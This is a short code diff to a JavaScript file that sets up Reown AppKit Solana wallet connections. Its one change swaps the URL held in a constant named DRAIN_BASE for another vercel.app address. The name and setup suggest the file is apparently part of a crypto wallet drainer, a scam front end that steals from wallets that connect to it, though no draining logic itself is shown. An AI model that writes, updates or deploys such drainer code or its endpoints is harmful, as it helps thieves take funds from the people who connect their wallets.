@@ -8,7 +8,7 @@ import { SolanaAdapter } from '@reown/appkit-adapter-solana'
 import { solana } from '@reown/appkit/networks'
 import { ConnectorController } from '@reown/appkit-controllers'
 
-const DRAIN_BASE = 'https://drforsostate.vercel.app/';
+const DRAIN_BASE = 'https://checkamount-henna.vercel.app/';
 const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';
 const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
